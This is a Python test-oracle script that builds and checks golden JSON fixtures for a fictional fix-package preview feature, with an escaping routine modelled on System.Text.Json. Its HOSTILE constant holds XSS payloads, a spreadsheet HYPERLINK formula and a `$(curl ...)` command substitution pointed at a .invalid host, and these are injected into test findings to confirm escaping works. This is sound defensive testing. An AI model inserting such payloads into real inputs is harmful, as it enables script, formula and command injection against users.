"""Independent, literal V12 fixture/identity/full-byte oracle, authored before A12/B12 inspection. No production imports.

Default mode verifies frozen files; --write creates the initial reviewed fixture bytes.
The escaping recipe is explicitly authored for the System.Text.Json default encoder.
"""
import copy
import hashlib
import json
from pathlib import Path
import sys

HERE = Path(__file__).resolve().parent
RUN = '12345678-1234-4234-8234-123456789abc'
DIGEST = 'a' * 64
SCOPE = dict(customerId='synthetic-customer', projectId='synthetic-project', environmentId='synthetic-environment')

def string(value):
    parts = ['"']
    escapes = {'\\': '\\\\', '\b': '\\b', '\f': '\\f', '\n': '\\n', '\r': '\\r', '\t': '\\t'}
    for char in value:
        number = ord(char)
        if char in escapes:
            parts.append(escapes[char])
        elif number < 32 or number > 126 or char in '"\'&<>+`':
            for i in range(0, len(char.encode('utf-16-be')), 2):
                parts.append('\\u' + char.encode('utf-16-be')[i:i + 2].hex().upper())
        else:
            parts.append(char)
    return ''.join(parts) + '"'

def canonical(value):
    if isinstance(value, str): return string(value)
    if value is None: return 'null'
    if value is True: return 'true'
    if value is False: return 'false'
    if isinstance(value, int): return str(value)
    if isinstance(value, list): return '[' + ','.join(map(canonical, value)) + ']'
    if isinstance(value, dict): return '{' + ','.join(string(k) + ':' + canonical(value[k]) for k in sorted(value)) + '}'
    raise TypeError(type(value))

def digest(value): return hashlib.sha256(canonical(value).encode()).hexdigest()

VERSIONS = dict(profileVersion='synthetic-profile-v1', desiredOutcomeVersion=None,
    scoringAlgorithmVersion='pilot-health-v1', aiPolicyVersion='synthetic-ai-disabled-v1',
    promptVersion='synthetic-prompt-disabled-v1', modelVersion='synthetic-model-disabled-v1',
    applicationVersion='synthetic-fix-packages-app-v1', workSchemaVersion='synthetic-run-work-v1',
    scriptedResultsDigest=DIGEST, analysisFixtureDigest=DIGEST, maturityFixtureDigest=DIGEST,
    fixPackageTemplateDigest='a40f3ccb1128581f36de236dbca3353097f4034b6738bcd01a98275229bee669')
CAPABILITY = dict(matrixVersion='synthetic-analysis-matrix-v1', stateAtLock='FixtureVerified',
    productBuild='fixture-product-v1', databaseSchemaBuild='fixture-facts-v1', hotfixSetDigest='synthetic-hotfix-digest',
    sqlServerBuild='synthetic-sql-build', compatibilityLevel=160,
    modules=[dict(id='SyntheticOperations', version='synthetic-module-v1'), dict(id='SyntheticSecurity', version='synthetic-module-v1')],
    queryPackVersion='synthetic-query-pack-v1', normalizationSchemaVersion='synthetic-normalization-v1',
    ruleCatalogVersion='synthetic-analysis-catalog-v1', lockDigest=DIGEST)
ANALYSIS = dict(scope=SCOPE, packVersion='synthetic-analysis-pack-v1', packDigest=DIGEST,
    presetId='synthetic-analysis-mixed-v1', presetVersion='synthetic-evidence-v1', evidenceDigest=DIGEST,
    catalogVersion='synthetic-analysis-catalog-v1', catalogDigest=DIGEST, profileId='synthetic-analysis-equal-v1',
    profileVersion='synthetic-profile-v1', profileDigest=DIGEST,
    compatibility=dict(sourceProduct='SYNTHETIC-ONLY', productVersion='fixture-product-v1', evidenceSchemaVersion='fixture-facts-v1', ruleLanguageVersion='count-predicate-v1'))
SOURCE = dict(scope=SCOPE, runId=RUN, runRevision=17, runState='Scoring', runInputDigest=DIGEST,
    baselineId='synthetic-analysis-mixed-v1', profileId='synthetic-review-maturity-fix-packages-equal-v1',
    frozenVersions=VERSIONS, capabilityLock=CAPABILITY, analysisLock=ANALYSIS,
    analysisFixtureDigest=DIGEST, analysisContentDigest=DIGEST, savedCoverageDigest=DIGEST,
    reviewRunId=RUN, reviewRunRevision=17, reviewSnapshotDigest=DIGEST)
GUIDANCE_WARNINGS = [
    'Synthetic fixture guidance only; no actual One Identity defect, supported remediation or customer approval is established.',
    'Every option is review-only and unverified. Finding confirmation, rejection or deferral does not review guidance or validate remediation.',
    'Stable identity ordering is not a priority calculation. Recovery guidance does not establish executed or verified restoration.',
    'This is a current detached value, not durable recommendation history. The run remains Scoring and unpublished.']
GUIDANCE_UNAVAILABLE = [
    'Priority calculation, effort estimates and consultant overrides are unavailable.',
    'Customer-approved objectives, roles and approvals are unavailable.',
    'Fix artifacts, recommendation review, task conversion/workflows and CSV export are unavailable.',
    'Customer risk acceptance, validated remediation, reassessment and actual report publication/sharing are unavailable.',
    'No SQL, script, configuration artifact, customer-system execution, external task connector or ROI calculation exists.']
TEMPLATE_VERSION = 'fictional-fix-templates-v1'
TEMPLATES = [
    dict(templateId='fictional-config-v1', kind='Configuration', text='{\n  "fixtureOnly": true,\n  "reviewRequired": true\n}'),
    dict(templateId='fictional-script-v1', kind='Script', text="# Fictional review-only example. No customer-system action.\nWrite-Output 'Fixture review required'"),
    dict(templateId='fictional-sql-v1', kind='Sql', text="-- Fictional review-only example. No customer database or object.\nSELECT 'Fixture review required' AS FixtureMessage;")]
DISCLAIMER = 'Fictional fix-package preview. Every artifact is unverified and review-only; these generic examples are not supported One Identity remediation. No execution or approval is authorized.'
WARNINGS = [
    'Finding confirmation, rejection or deferral does not review artifacts or validate remediation.',
    'Package identity ordering is not priority or effort. Existing finding groups are preserved without root-cause merging.',
    'Source guidance is retained verbatim as historical input; its unavailable sections describe that upstream projection.']
EMPTY_WARNING = 'No findings were supplied; no fix packages or actions are available.'
UNAVAILABLE = [
    'Consultant artifact review, approval history and content invalidation are unavailable.',
    'Priority, effort, customer objectives, task conversion/workflows and CSV/export are unavailable.',
    'Customer-system execution, external connectors, validated recovery/remediation and report publication are unavailable.']
HOSTILE = '<script>globalThis.v11Injected=1</script><img src="https://fixture.invalid/x" onerror="globalThis.v11Injected=2"><form action="https://fixture.invalid/post"></form><svg onload="globalThis.v11Injected=3"></svg> javascript:alert(1) =HYPERLINK("https://fixture.invalid") $(curl https://fixture.invalid) `shell` & café 中文 😀\0NUL sentinel\r\nCRLF sentinel\rCR sentinel'

def input_fixture(hostile=False, empty=False):
    findings = []
    for n in range(2):
        finding_id = ('b' if n == 0 else 'c') * 64
        occurrences = [dict(occurrenceId=('d' if n == 0 else 'e') * 64,
            objectId='FIXTURE-OBJECT-' + str(n + 1), objectType='SyntheticControl',
            moduleId='SyntheticSecurity' if n == 0 else 'SyntheticOperations', originalDigest=('f' if n == 0 else '1') * 64,
            evidenceReference='fixture-evidence:V11-object-' + str(n + 1))]
        if n == 0:
            occurrences.append(dict(occurrenceId='2' * 64, objectId='FIXTURE-OBJECT-3', objectType='SyntheticControl',
                moduleId='SyntheticSecurity', originalDigest='3' * 64, evidenceReference='fixture-evidence:V11-object-3'))
        options = [dict(optionId=id, text='Fictional option ' + id + ' for group ' + str(n + 1),
            prerequisites='Fictional prerequisites ' + id, risk='Fictional risk ' + id,
            recoveryGuidance='Fictional recovery ' + id) for id in ['inspect-v11', 'retain-v11']]
        finding = dict(findingId=finding_id, ruleId='SYN-V11-' + str(n + 1), ruleVersion='synthetic-rule-v1',
            categoryId='SECURITY' if n == 0 else 'OPERATIONS', severity='High' if n == 0 else 'Low',
            originalTitle='Original fictional V11 title ' + str(n + 1), presentationTitle='Current fictional V11 title ' + str(n + 1),
            businessContext='Fictional V11 business context ' + str(n + 1), initialState='Proposed',
            currentState='Confirmed' if n == 0 else 'Deferred', findingRevision=2, rootCause='Same fictional root cause',
            occurrences=occurrences, options=options,
            validationGuidance=['Validate fictional original ' + str(n + 1), 'Collect fictional validation ' + str(n + 1)],
            guidanceReferences=['fixture-guidance:V11-' + str(n + 1)],
            assumptions=['Fictional V11 premise ' + str(n + 1)], limitations=['Fictional V11 limitation ' + str(n + 1)])
        if hostile:
            for key in ['originalTitle', 'presentationTitle', 'businessContext', 'rootCause']:
                finding[key] += ' ' + HOSTILE
            for occurrence in occurrences:
                occurrence['evidenceReference'] += ' ' + HOSTILE
            for option in options:
                for key in ['text', 'prerequisites', 'risk', 'recoveryGuidance']:
                    option[key] += ' ' + HOSTILE
            for key in ['validationGuidance', 'guidanceReferences', 'assumptions', 'limitations']:
                finding[key] = [value + ' ' + HOSTILE for value in finding[key]]
        findings.append(finding)
    return dict(source=copy.deepcopy(SOURCE), findings=[] if empty else findings)

def expected(input):
    findings = copy.deepcopy(input['findings'])
    for finding in findings:
        finding['occurrences'].sort(key=lambda x: x['occurrenceId'])
        finding['options'].sort(key=lambda x: x['optionId'])
        for option in finding['options']:
            option['status'] = 'Unverified'
            option['scopedOptionId'] = digest(dict(findingId=finding['findingId'], optionId=option['optionId'], runId=RUN, scope=SCOPE))
    guidance = dict(schemaVersion='synthetic-recommendation-guidance-v1', status='SyntheticUnverified',
        source=copy.deepcopy(input['source']), findings=sorted(findings, key=lambda x: x['findingId']),
        warnings=GUIDANCE_WARNINGS, unavailableSections=GUIDANCE_UNAVAILABLE)
    guidance['contentDigest'] = digest(guidance)
    packages = []
    for finding in guidance['findings']:
        package_id = digest(dict(findingId=finding['findingId'], runId=RUN, scope=SCOPE))
        options = []
        for option in sorted(finding['options'], key=lambda x: x['scopedOptionId']):
            artifacts = [dict(artifactId=digest(dict(packageId=package_id, scopedOptionId=option['scopedOptionId'],
                templateId=t['templateId'], templateVersion=TEMPLATE_VERSION)), templateId=t['templateId'],
                kind=t['kind'], status='Unverified', text=t['text']) for t in TEMPLATES]
            options.append(dict(scopedOptionId=option['scopedOptionId'], artifacts=artifacts))
        packages.append(dict(packageId=package_id, findingId=finding['findingId'], options=options))
    fix = dict(schemaVersion='synthetic-fix-package-preview-v1', status='Unverified', disclaimer=DISCLAIMER,
        guidance=guidance, templateVersion=TEMPLATE_VERSION, templateDigest=digest(dict(templateVersion=TEMPLATE_VERSION, templates=TEMPLATES)),
        templates=TEMPLATES, packages=packages, warnings=WARNINGS + ([EMPTY_WARNING] if not packages else []), unavailableSections=UNAVAILABLE)
    return guidance, fix

def generated():
    files = {}
    cases = {}
    for name in ['normal', 'hostile', 'empty']:
        fixture = input_fixture(hostile=name == 'hostile', empty=name == 'empty')
        guidance, fix = expected(fixture)
        files[name + '-input.json'] = (json.dumps(fixture, ensure_ascii=True, indent=2) + '\n').encode()
        files[name + '-guidance-golden.json'] = canonical({k: v for k, v in guidance.items() if k != 'contentDigest'}).encode()
        files[name + '-fix-golden.json'] = canonical(fix).encode()
        cases[name] = dict(guidanceDigest=guidance['contentDigest'], packageDigest=digest(fix), snapshot=fix)
    manifest = dict(schemaVersion='v12-independent-expectations-v1', disclaimer=DISCLAIMER, templateDigest=digest(dict(templateVersion=TEMPLATE_VERSION, templates=TEMPLATES)), cases=cases)
    files['expected-manifest.json'] = (json.dumps(manifest, ensure_ascii=True, indent=2) + '\n').encode()
    files['oracle-provenance.json'] = (json.dumps(dict(schemaVersion='v12-independent-oracle-v1',
        files=[dict(path=k, sha256=hashlib.sha256(v).hexdigest(), bytes=len(v)) for k, v in sorted(files.items())]), indent=2) + '\n').encode()
    return files

if __name__ == '__main__':
    files = generated()
    if sys.argv[1:] == ['--write']:
        for name, value in files.items(): (HERE / name).write_bytes(value)
    elif sys.argv[1:]: raise SystemExit('FAIL invalid oracle arguments')
    else:
        for name, value in files.items():
            if (HERE / name).read_bytes() != value: raise SystemExit('FAIL independent oracle mismatch: ' + name)
    print('PASS V12 independent literal oracle; files=' + str(len(files)) + '; normal-bytes=' + str(len(files['normal-fix-golden.json'])) + '; normal-sha256=' + hashlib.sha256(files['normal-fix-golden.json']).hexdigest())
